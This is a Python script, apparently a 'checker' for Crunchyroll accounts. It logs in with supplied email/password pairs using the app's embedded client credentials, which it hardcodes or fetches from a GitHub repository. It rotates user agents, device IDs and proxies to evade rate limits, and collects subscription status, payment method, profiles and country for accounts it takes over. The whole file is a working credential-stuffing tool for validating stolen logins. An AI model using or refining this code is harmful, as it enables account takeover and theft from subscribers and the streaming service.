# crunchyroll_checker.py
import requests
import random
import uuid
import re
from datetime import datetime, timedelta
import time           
import base64

# ================== AUTO FETCH CREDENTIALS ==================
def get_fresh_credentials():
    urls = [
        "https://raw.githubusercontent.com/vitalygashkov/crextractor/main/credentials.tv.json",
        "https://raw.githubusercontent.com/vitalygashkov/crextractor/main/credentials.mobile.json"
    ]
    
    for url in urls:
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                creds = resp.json()
                client_id = creds.get("client_id")
                client_secret = creds.get("client_secret")
                basic_auth = creds.get("authorization")
                
                if basic_auth and not basic_auth.startswith("Basic "):
                    basic_auth = "Basic " + basic_auth.strip()
                
                print(f"[+] Loaded fresh credentials from crextractor")
                return client_id, client_secret, basic_auth
        except:
            continue
    
    print("[!] Using built-in fallback")
    fallback_basic = "Basic bm1oaGcwbDZ4eXhjZm02aHQ2aGY6SjR6bU1mdjNkMVFkWHk4dDk2d1NjeDdoUnkzclBHLTM="
    return "nmhhg0l6xyxcfm6ht6hf", "J4zmMfv3d1QdXy8t96wScx7hRy3rPG-3", fallback_basic

# ============= IMPROVED UA + DEVICE ROTATION (Point 2) =============
def generate_random_user_agent():
    """Much better and more realistic UAs (including official Crunchyroll app)"""
    user_agents = [
        "Crunchyroll/3.79.1 Android/14 okhttp/4.12.0",
        "Crunchyroll/3.80.0 Android/15 okhttp/4.12.0",
        "Crunchyroll/3.78.2 Android/14 okhttp/4.12.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Dalvik/2.1.0 (Linux; U; Android 14; SM-S918B Build/UP1A.231005.007)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)",
    ]
    return random.choice(user_agents)

def generate_random_device_info():
    """Better device fingerprinting"""
    device_id = str(uuid.uuid4())
    return device_id, "SamsungTV", "TV"   # You can expand this list later if you want

def check_crunchyroll(email, password, proxy=None):
    """FINAL VERSION - Stronger Payment Method extraction"""
    result = {
        'email': email,
        'password': password,
        'success': False,
        'message': '',
        'email_verified': 'No',
        'account_creation': '',
        'profile_names': [],
        'plan': 'None',
        'currency': 'N/A',
        'subscribable': 'False',
        'free_trial': 'False',
        'expiry': '',
        'active': 'False',
        'country': 'ZZ',
        'username': 'Unknown',
        'plan_sub': 'Unknown',
        'max_streams': 'Unknown',
        'payment_method': 'Unknown',
        'auto_renewal': 'N/A',
        'subscription_start': 'N/A',
        'billing_interval': 'N/A',
        'profile_count': 'N/A',
        'preferred_language': 'N/A',
        'next_download': 'N/A',
        'birthday': 'N/A',
        'gender': 'N/A',
        'receive_promos': 'No',
        'token_expiry': 'N/A',
        'device_type': 'N/A',
        'device_name': 'N/A',
        'last_updated': 'N/A',
    }

    proxies = {'http': proxy, 'https': proxy} if proxy else None
    max_retries = 4

    # ================== FRESH TV CREDENTIALS (May 2026) ==================
    CLIENT_ID, CLIENT_SECRET, BASIC_AUTH = get_fresh_credentials()
    if not BASIC_AUTH:
        BASIC_AUTH = base64.b64encode(f"{CLIENT_ID}:{CLIENT_SECRET}".encode()).decode()
    # =====================================================================


    for attempt in range(max_retries):
        try:
            device_id, _, _ = generate_random_device_info()
            user_agent = generate_random_user_agent()

            # ====================== LOGIN ======================
            token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
            
            token_data = {
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "offline_access",
                "client_id": CLIENT_ID,
                "device_type": "SamsungTV",
                "device_id": device_id,
                "device_name": "Goku"
            }

            headers = {
                "Host": "beta-api.crunchyroll.com",
                "Authorization": BASIC_AUTH if BASIC_AUTH.startswith("Basic ") else f"Basic {BASIC_AUTH}",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": user_agent,
                "etp-anonymous-id": device_id,
                "x-datadog-sampling-priority": "0",
                "Accept-Encoding": "gzip",
            }

            print(f"[DEBUG] Authorization: {BASIC_AUTH[:50]}...")   # ← For debugging

            resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)
            print(f"[CR] {email} | Status: {resp.status_code} | Body: {resp.text[:400]}")

            if resp.status_code == 200:
                access_token = resp.json().get('access_token')
                if not access_token:
                    continue

            elif resp.status_code == 401:
                error_text = resp.text.lower()
                if "client_inactive" in error_text or "invalid_client" in error_text:
                    print(f"[!] Credentials expired → Fetching new ones from crextractor...")
                    CLIENT_ID, CLIENT_SECRET, BASIC_AUTH = get_fresh_credentials()
                    if not BASIC_AUTH:
                        BASIC_AUTH = base64.b64encode(f"{CLIENT_ID}:{CLIENT_SECRET}".encode()).decode()
                    continue  # Retry login with new credentials
                else:
                    result['message'] = "Invalid email or password"
                    return result

            elif resp.status_code == 429:
                time.sleep(3 + attempt * 2)
                continue
            else:
                if attempt < max_retries - 1:
                    time.sleep(1.5 + random.uniform(0, 1))
                    continue
                result['message'] = f"Login failed (HTTP {resp.status_code})"
                return result

            acc_headers = {
                'Authorization': f'Bearer {access_token}',
                'User-Agent': user_agent,
                'etp-anonymous-id': str(uuid.uuid4()),
                'x-datadog-sampling-priority': '0',
                'accept-encoding': 'gzip'
            }

            acc_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me",
                                  headers=acc_headers, proxies=proxies, timeout=25)
            print(f"[CR] Account fetch | Status: {acc_resp.status_code} | Body: {acc_resp.text[:300]}")

            # ← ADD THIS BLOCK
            if acc_resp.status_code != 200:
                error_map = {
                    400: "Bad token scope — skipping",
                    401: "Token expired mid-request — retrying",
                    403: "Region blocked or account flagged",
                    429: "Rate limited by Crunchyroll — retrying",
                    503: "Crunchyroll API down temporarily — retrying"
                }
                error_msg = error_map.get(acc_resp.status_code, f"Account fetch failed (HTTP {acc_resp.status_code})")
                
                # Retry-worthy codes
                if acc_resp.status_code in [401, 429, 503] and attempt < max_retries - 1:
                    time.sleep(2 + attempt * 2)
                    continue
                
                result['message'] = error_msg
                return result

            if acc_resp.status_code == 200:
                acc_data = acc_resp.json()
                result['email_verified'] = 'Yes' if acc_data.get('email_verified') else 'No'
                if acc_data.get('created'):
                    result['account_creation'] = acc_data['created'].split('T')[0]
                external_id = acc_data.get('external_id')

                if external_id:
                    # Subscription
                    subs_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}",
                                           headers=acc_headers, proxies=proxies, timeout=25)
                    if subs_resp.status_code == 200:
                        subs_data = subs_resp.json()
                        result['active'] = 'Yes' if subs_data.get('is_active') else 'No'
                        result['expiry'] = subs_data.get('next_renewal_date', '').split('T')[0] if subs_data.get('next_renewal_date') else ''
                        result['country'] = subs_data.get('subscription_country') or subs_data.get('country_code', 'ZZ')
                        result['currency'] = subs_data.get('currency_code', 'N/A')

                        # Billing interval from cycle_duration
                        cycle = subs_data.get('cycle_duration', '')
                        cycle_map = {'P1Y': 'Yearly', 'P1M': 'Monthly', 'P3M': '3 Months', 'P6M': '6 Months'}
                        result['billing_interval'] = cycle_map.get(cycle, cycle or 'N/A')

                        # Sub Start + Auto Renewal — check every possible location CR uses
                        sub_start_found = False
                        auto_renewal_found = False

                        # Priority 1: subscription_products array
                        products = subs_data.get('subscription_products', [])
                        if products:
                            p = products[0]
                            for date_key in ('effective_date', 'start_date', 'startDate', 'created', 'purchase_date'):
                                val = p.get(date_key, '')
                                if val:
                                    result['subscription_start'] = val.split('T')[0]
                                    sub_start_found = True
                                    break
                            is_cancelled = p.get('is_cancelled')
                            if is_cancelled is not None:
                                result['auto_renewal'] = 'No' if is_cancelled else 'Yes'
                                auto_renewal_found = True

                        # Priority 2: subscriptions array
                        if not sub_start_found or not auto_renewal_found:
                            subs_list = subs_data.get('subscriptions', [])
                            if subs_list:
                                s = subs_list[0]
                                if not sub_start_found:
                                    for date_key in ('startDate', 'start_date', 'effective_date', 'created', 'purchase_date'):
                                        val = s.get(date_key, '')
                                        if val:
                                            result['subscription_start'] = val.split('T')[0]
                                            sub_start_found = True
                                            break
                                if not auto_renewal_found:
                                    qualifier = s.get('subscriptionQualifier', s.get('subscription_qualifier', ''))
                                    cancel_at = s.get('cancelAtPeriodEnd', s.get('cancel_at_period_end'))
                                    is_cancelled = s.get('is_cancelled')
                                    if qualifier:
                                        result['auto_renewal'] = 'Yes' if qualifier == 'RECURRING' else 'No'
                                        auto_renewal_found = True
                                    elif cancel_at is not None:
                                        result['auto_renewal'] = 'No' if cancel_at else 'Yes'
                                        auto_renewal_found = True
                                    elif is_cancelled is not None:
                                        result['auto_renewal'] = 'No' if is_cancelled else 'Yes'
                                        auto_renewal_found = True

                        # Priority 3: top-level subs_data fields
                        if not sub_start_found:
                            for date_key in ('start_date', 'startDate', 'effective_date', 'created'):
                                val = subs_data.get(date_key, '')
                                if val:
                                    result['subscription_start'] = val.split('T')[0]
                                    sub_start_found = True
                                    break

                        if not auto_renewal_found:
                            for key in ('auto_renewal', 'autoRenewal', 'is_auto_renew', 'autoRenew'):
                                val = subs_data.get(key)
                                if val is not None:
                                    result['auto_renewal'] = 'Yes' if val else 'No'
                                    auto_renewal_found = True
                                    break

                        # Final fallback
                        if not sub_start_found:
                            # Calculate from expiry - billing cycle
                            try:
                                if result.get('expiry') and result.get('billing_interval'):
                                    expiry_date = datetime.strptime(result['expiry'], "%Y-%m-%d")
                                    interval = result['billing_interval']
                                    if interval == 'Yearly':
                                        start = expiry_date - timedelta(days=365)
                                    elif interval == 'Monthly':
                                        start = expiry_date - timedelta(days=30)
                                    elif interval == '3 Months':
                                        start = expiry_date - timedelta(days=90)
                                    elif interval == '6 Months':
                                        start = expiry_date - timedelta(days=180)
                                    else:
                                        start = None
                                    if start:
                                        result['subscription_start'] = start.strftime("%Y-%m-%d")
                                    else:
                                        result['subscription_start'] = 'N/A'
                                else:
                                    result['subscription_start'] = 'N/A'
                            except:
                                result['subscription_start'] = 'N/A'

                    # Products
                    prod_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products",
                                           headers=acc_headers, proxies=proxies, timeout=25)
                    if prod_resp.status_code == 200:
                        items = prod_resp.json().get('items', [])
                        if items:
                            product = items[0].get('product', {})
                            result['plan'] = product.get('sku', 'None')
                            result['currency'] = items[0].get('currency_code') or result['currency']
                            result['subscribable'] = 'Yes' if product.get('is_subscribable') else 'False'
                            result['free_trial'] = 'Yes' if items[0].get('active_free_trial') else 'False'

                    # ← ADD HERE: auto_renewal SKU fallback (after plan SKU is populated)
                    if not auto_renewal_found:
                        plan_sku = result.get('plan', '').lower()
                        if any(x in plan_sku for x in ['year', 'annual', '1y', '12m']):
                            result['auto_renewal'] = 'Yes'
                        elif any(x in plan_sku for x in ['month', '1m', 'recurring', 'fan', 'pack']):
                            result['auto_renewal'] = 'Yes'
                        else:
                            result['auto_renewal'] = 'N/A'

                    # ================== PAYMENT METHOD — v3 endpoint ==================
                    benefits_resp = requests.get(
                        f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
                        headers=acc_headers, proxies=proxies, timeout=25
                    )

                    # === Payment Method: extract from already-fetched data ===
                    payment_found = False

                    if subs_resp.status_code == 200:
                        subs_data_raw = subs_resp.json()

                        # Check top-level fields
                        for key in ('paymentMethod', 'payment_method', 'paymentMethodType'):
                            val = subs_data_raw.get(key, '')
                            if val:
                                result['payment_method'] = str(val).replace('_', ' ').title()
                                payment_found = True
                                break

                        # Check subscriptions array
                        if not payment_found:
                            for sub_item in subs_data_raw.get('subscriptions', []):
                                for key in ('paymentMethod', 'payment_method', 'paymentMethodType', 'store'):
                                    val = sub_item.get(key, '')
                                    if val:
                                        result['payment_method'] = str(val).replace('_', ' ').title()
                                        payment_found = True
                                        break
                                if payment_found:
                                    break

                        # Check subscription_products array
                        if not payment_found:
                            for prod_item in subs_data_raw.get('subscription_products', []):
                                for key in ('paymentMethod', 'payment_method', 'store', 'paymentMethodType'):
                                    val = prod_item.get(key, '')
                                    if val:
                                        result['payment_method'] = str(val).replace('_', ' ').title()
                                        payment_found = True
                                        break
                                if payment_found:
                                    break

                    # Fallback: infer from plan SKU or currency
                    if not payment_found:
                        plan_sku = result.get('plan', '').lower()
                        if 'apple' in plan_sku or 'ios' in plan_sku:
                            result['payment_method'] = 'Apple Store'
                        elif 'google' in plan_sku or 'android' in plan_sku:
                            result['payment_method'] = 'Google Play'
                        elif 'amazon' in plan_sku:
                            result['payment_method'] = 'Amazon'
                        elif result.get('currency') not in ('N/A', '', None):
                            result['payment_method'] = 'Card / Web'
                        else:
                            result['payment_method'] = 'N/A'
                    # ====================================================================

                    # Plan & Max Streams (kept from your original code)
                    if benefits_resp.status_code == 200:
                        benefits_data = benefits_resp.text
                        benefit_match = re.search(r'"benefit":"concurrent_streams\.(\d+)"', benefits_data)
                        if benefit_match:
                            streams = benefit_match.group(1)
                            if streams == "6":
                                result['plan_sub'] = "ULTIMATE FAN MEMBER"
                                result['max_streams'] = "6"
                            elif streams == "4":
                                result['plan_sub'] = "MEGA FAN MEMBER"
                                result['max_streams'] = "4"
                            elif streams == "1":
                                result['plan_sub'] = "FAN MEMBER"
                                result['max_streams'] = "1"
                            else:
                                result['plan_sub'] = f"UNKNOWN ({streams})"
                                result['max_streams'] = streams

            # Username
            profile_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile",
                                      headers=acc_headers, proxies=proxies, timeout=25)
            if profile_resp.status_code == 200:
                try:
                    profile_json = profile_resp.json()
                    profiles = profile_json.get('profiles', [])
                    print(f"[DEBUG profiles]: {profiles[:2]}") 

                    # Extract account username (first profile's username field)
                    username_match = re.search(r'"username":"(.*?)"', profile_resp.text)
                    if username_match:
                        result['username'] = username_match.group(1)

                    # Profile count
                    result['profile_count'] = str(len(profiles))

                    # Extract profile display names
                    profile_names = []
                    for p in profiles:
                        name = p.get('profile_name') or p.get('name') or p.get('username') or p.get('profile_id', '')
                        if name:
                            is_kid = p.get('is_kid_profile', False)
                            kid_tag = ' 👶' if is_kid else ''
                            profile_names.append(f"{name}{kid_tag}")
                    result['profile_names'] = profile_names

                except Exception:
                    # Fallback to regex if JSON parse fails
                    username_match = re.search(r'"username":"(.*?)"', profile_resp.text)
                    if username_match:
                        result['username'] = username_match.group(1)
                    result['profile_count'] = str(len(re.findall(r'"profile_id"', profile_resp.text)))
                    result['profile_names'] = []

                LOCALE_MAP = {
                    "en-US": "English", "en-GB": "English (UK)",
                    "es-419": "Spanish (Latin America)", "es-ES": "Spanish (Spain)",
                    "pt-BR": "Portuguese (Brazil)", "pt-PT": "Portuguese (Portugal)",
                    "fr-FR": "French", "de-DE": "German", "it-IT": "Italian",
                    "ru-RU": "Russian", "ar-ME": "Arabic", "ar-SA": "Arabic",
                    "zh-CN": "Chinese (Simplified)", "zh-TW": "Chinese (Traditional)",
                    "ja-JP": "Japanese", "ko-KR": "Korean", "hi-IN": "Hindi",
                    "tr-TR": "Turkish", "pl-PL": "Polish", "nl-NL": "Dutch",
                    "sv-SE": "Swedish", "fi-FI": "Finnish", "nb-NO": "Norwegian",
                    "da-DK": "Danish", "ro-RO": "Romanian", "hu-HU": "Hungarian",
                    "cs-CZ": "Czech", "sk-SK": "Slovak", "uk-UA": "Ukrainian",
                    "id-ID": "Indonesian", "ms-MY": "Malay", "th-TH": "Thai",
                    "vi-VN": "Vietnamese", "fil-PH": "Filipino",
                }

                lang_match = re.search(r'"preferred_content_audio_language"\s*:\s*"([^"]+)"', profile_resp.text)
                if not lang_match:
                    lang_match = re.search(r'"preferred_content_subtitle_language"\s*:\s*"([^"]+)"', profile_resp.text)
                if lang_match:
                    raw_lang = lang_match.group(1)
                    result['preferred_language'] = LOCALE_MAP.get(raw_lang, raw_lang)

            # Final decision
            if result['active'] == 'Yes':
                result['success'] = True
                result['message'] = 'ACTIVE SUBSCRIPTION!'
            else:
                result['message'] = 'Valid account but no paid plan'

            return result

        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt + random.uniform(0.5, 2))
                continue
            result['message'] = f'Error: {str(e)[:80]}'
            return result
        
    if not result.get('message'):
        result['message'] = 'Temporary API error — try again'

    return result